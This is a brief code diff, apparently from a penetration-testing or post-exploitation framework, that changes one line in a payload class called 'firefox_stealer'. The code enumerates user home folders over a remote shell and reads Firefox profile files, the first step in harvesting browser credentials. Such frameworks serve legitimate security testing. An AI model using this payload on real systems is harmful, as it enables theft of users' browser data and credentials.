@@ -30,7 +30,7 @@ class firefox_stealer(base_payload):
             else:
                 return []
 
-        users_folders = self.exec_payload('users_name').values()
+        users_folders = self.exec_payload('users').values()
         for users in users_folders:
             list = parse_mozilla_dir_path(self.shell.read(users+'.mozilla/firefox/profiles.ini'))
             if list:
